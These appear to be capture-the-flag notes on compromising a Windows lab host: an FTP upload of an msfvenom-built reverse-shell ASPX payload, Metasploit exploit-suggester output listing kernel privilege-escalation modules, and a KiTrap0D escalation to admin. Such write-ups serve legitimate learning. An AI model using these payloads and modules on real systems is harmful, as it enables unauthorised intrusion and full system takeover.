1. Connect to FTP server
2. Upload webshell
3. Access it via <IP>/webshell.aspx
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=14000 -f aspx > shell.aspx
```
4. Find method for privEsc
```metasploit
use post/multi/recon/local_exploit_suggester
```

exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
  This module will bypass Windows UAC by hijacking a special key in 
  the Registry under the current user hive, and inserting a custom 
  command that will get invoked when the Windows Event Viewer is 
  launched. It will spawn a second shell that has the UAC flag turned 
  off. This module modifies a registry key, but cleans up the key once 
  the payload has been invoked. The module does not require the 
  architecture of the payload to match the OS. If specifying 
  EXE::Custom your DLL should call ExitProcess() after starting your 
  payload in a separate process.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
  This module will create a new session with SYSTEM privileges via the 
  KiTrap0D exploit by Tavis Ormandy. If the session in use is already 
  elevated then the exploit will not run. The module relies on 
  kitrap0d.x86.dll, and is not supported on x64 editions of Windows.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator:  NOT WORKING
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
  This module leverages a kernel pool overflow in Win32k which allows 
  local privilege escalation. The kernel shellcode nulls the ACL for 
  the winlogon.exe process (a SYSTEM process). This allows any 
  unprivileged process to freely migrate to winlogon.exe, achieving 
  privilege escalation. This exploit was used in pwn2own 2013 by MWR 
  to break out of chrome's sandbox. NOTE: when a meterpreter session 
  started by this exploit exits, winlogin.exe is likely to crash.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
  This module exploits a vulnerability in win32k.sys where under 
  specific conditions TrackPopupMenuEx will pass a NULL pointer to the 
  MNEndMenuState procedure. This module has been tested successfully 
  on Windows 7 SP0 and Windows 7 SP1.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  This module exploits a NULL Pointer Dereference in win32k.sys, the 
  vulnerability can be triggered through the use of TrackPopupMenu. 
  Under special conditions, the NULL pointer dereference can be abused 
  on xxxSendMessageTimeout to achieve arbitrary code execution. This 
  module has been tested successfully on Windows XP SP3, Windows 2003 
  SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 
  and Windows 2008 R2 SP1 64 bits.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
  This module abuses a process creation policy in Internet Explorer's 
  sandbox; specifically, Microsoft's RemoteApp and Desktop Connections 
  runtime proxy, TSWbPrxy.exe. This vulnerability allows the attacker 
  to escape the Protected Mode and execute code with Medium Integrity. 
  At the moment, this module only bypass Protected Mode on Windows 7 
  SP1 and prior (32 bits). This module has been tested successfully on 
  Windows 7 SP1 (32 bits) with IE 8 and IE 11.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
  This module exploits the vulnerability in mrxdav.sys described by 
  MS16-016. The module will spawn a process on the target system and 
  elevate its privileges to NT AUTHORITY\SYSTEM before executing the 
  specified payload within the context of the elevated process.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
  This module exploits the lack of sanitization of standard handles in 
  Windows' Secondary Logon Service. The vulnerability is known to 
  affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This 
  module will only work against those versions of Windows with 
  Powershell 2.0 or later and systems with two or more CPU cores.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
  Module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. Currently the 
  module does not spawn as SYSTEM, however once achieving a shell, one 
  can easily use incognito to impersonate the token.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
  This module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. It requires a 
  CLSID string.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
  This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due 
  to the usage of uninitialized data which allows to corrupt memory. 
  At the moment, the module has been tested successfully on Windows XP 
  SP3, Windows 2003 SP1, and Windows 7 SP1.



# PrivEsc
Using exploit/windows/local/ms10_015_kitrap0d and changing the LHOST to my VPN value instead of the eth0, I was able to get admin.

Flags were located in the Desktop of the user bobsy? and Administrator


